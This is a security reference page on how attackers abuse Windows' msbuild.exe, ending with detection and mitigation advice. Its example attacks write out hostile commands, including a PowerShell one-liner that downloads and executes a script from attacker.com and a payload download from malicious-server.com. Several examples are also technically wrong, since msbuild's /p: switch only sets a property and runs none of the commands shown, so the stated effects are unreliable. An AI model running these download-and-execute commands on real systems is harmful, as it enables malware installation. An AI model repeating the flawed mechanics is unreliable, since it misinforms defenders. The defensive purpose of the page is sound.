# msbuild.exe
## What is it?
*```msbuild.exe``` is a command-line tool used to build .NET applications, specifically by compiling and linking source code files, such as C# or Visual Basic, into executable programs or libraries.*

*It is a legitimate Windows utility and is part of the Microsoft Visual Studio suite. While typically used by developers, it can also be abused by attackers to execute malicious code, as it has the ability to run arbitrary scripts during the build process.*

## Legitimate Usage
- **Building .NET Applications** → Used by developers to compile, build, and package .NET applications from source code.
- **Automating Build Processes** → Helps automate the process of compiling and building large .NET projects, often as part of continuous integration (CI) pipelines.
- **Creating and Deploying Libraries** → Used to compile and package assemblies, libraries, and executables for distribution or deployment.

## How to abuse it
- **Running Malicious Code via Build Scripts** → Attackers can craft build scripts that include malicious code or download payloads during the build process, leveraging ```msbuild.exe``` to execute them.
- **Bypassing Security Controls** → Since ```msbuild.exe``` is a trusted binary, security software may overlook the malicious activities executed through it, such as running PowerShell scripts, downloading payloads, or creating malicious processes.
- **Persistence via Compiled Malware** → Attackers can use ```msbuild.exe``` to compile and execute payloads, gaining persistence on a victim's machine.
- **Exfiltration of Data** → Malicious build scripts can be used to extract sensitive data from a system or network by automating file transfers or executing exfiltration commands during the build process.

## Example attacks
### 1. Running Malicious PowerShell via Build Script
*Attackers can inject malicious PowerShell scripts into build files that get executed when ```msbuild.exe``` runs.*

**Run Malicious PowerShell Script via Build**

```
msbuild.exe /t:build /p:CustomAction="powershell.exe -ExecutionPolicy Bypass -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**Effect:**
- Executes a PowerShell script downloaded from an external server, potentially leading to malware installation or data exfiltration.

### 2. Downloading Malware via Build Script
*Attackers can use ```msbuild.exe``` to download and execute malware during the build process by calling external servers in the build scripts.*

**Download Malware During Build**

```
msbuild.exe /t:build /p:DownloadPayload="Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Temp\payload.exe'"
```

**Effect:**
- Downloads and executes malware during the build process, allowing attackers to compromise the machine.

### 3. Bypassing Antivirus via Legitimate Tools
*Since ```msbuild.exe``` is a trusted executable, security software might not flag or block malicious activities performed through it.*

**Run Malware Using ```msbuild.exe```**

```
msbuild.exe /t:build /p:RunMaliciousCode="cmd.exe /c C:\malicious\payload.bat"
```

**Effect:**
- Executes a malicious batch script on the system, potentially installing a backdoor or exfiltrating data.

### 4. Compiling Malicious Code
*Attackers can use ```msbuild.exe``` to compile malicious code, such as custom payloads or malicious DLLs, to be executed on the victim's system.*

**Compile and Execute Malicious DLL**

```
msbuild.exe /t:build /p:BuildMaliciousDLL="C:\malicious\payload.cs"
```

**Effect:**
- Compiles a malicious C# source code file and executes it, infecting the system with malware.

### 5. Lateral Movement and Persistence
*Attackers can leverage ```msbuild.exe``` to execute scripts or payloads that allow them to move laterally across the network or maintain persistence on the compromised system.*

**Use Build Script to Deploy Malware on Other Systems**

```
msbuild.exe /t:build /p:DeployMalware="Copy-Item '\attacker\payload.exe' -Destination 'C:\Windows\Temp\payload.exe'"
```

**Effect:**
- Copies a malware payload to a target machine and executes it, achieving persistence and potentially lateral movement.

# Detection & Mitigation
## Detection Methods
**Monitor ```msbuild.exe``` Activity**
- **Event ID 4688 (Process Creation)** → Detect the execution of ```msbuild.exe``` with suspicious arguments, such as those that download files or execute external scripts.
- **Monitor Build Scripts** → Analyze the contents of build scripts for suspicious commands or references to external URLs, PowerShell commands, or executable files.
  
**Detect Suspicious Network Activity**
- **Network Traffic Analysis** → Monitor network traffic for downloads of malicious payloads during the build process, such as from external servers or IPs.

**File Integrity Monitoring**
- **Detect New Executables** → Monitor for new executable files or scripts that are created during a build process, especially in temporary directories like ```C:\Temp```.

## Mitigation Strategies
- **Restrict Access to ```msbuild.exe```** → Limit the execution of ```msbuild.exe``` to trusted users and environments, particularly in production environments.
- **Use Application Whitelisting (AppLocker, WDAC)** → Prevent the execution of unauthorized ```msbuild.exe``` processes or scripts that contain malicious commands.
- **Monitor Build Environments** → Audit build environments regularly for unauthorized changes or additions to build scripts that could be used for malicious purposes.
- **Scan Build Outputs for Malware** → Use antivirus or endpoint protection solutions to scan output files created by ```msbuild.exe``` for signs of malware or suspicious behavior.
- **Disable Internet Access for Build Systems** → Restrict internet access to build systems to prevent them from downloading malicious files during the build process.
